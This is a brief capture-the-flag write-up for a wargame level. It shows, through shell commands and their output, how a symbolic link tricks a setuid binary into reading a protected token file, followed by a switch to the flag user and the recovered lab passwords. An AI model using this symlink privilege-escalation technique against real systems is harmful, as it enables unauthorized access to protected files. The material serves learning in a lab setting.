## writeup level08

When we log in as user level08, we have 2 files:
```shell
$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
```
Again the suid flag, the token flag has permissions only for the flag08 user. Let's try:
```shell
$ ./level08
./level08 [file to read]

$ ./level08 token
You may not access 'token'
```
So we want the binary to read the file, so we create a symbolic link that will enable this:
```shell
$ ln -sfv $PWD/token /tmp/readtoken
`/tmp/readtoken' -> `/home/user/level08/token'

$ ./level08 /tmp/readtoken
quif5eloekouj29ke0vouxean

$ su flag08
Password:
quif5eloekouj29ke0vouxean
Don't forget to launch getflag !

$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```
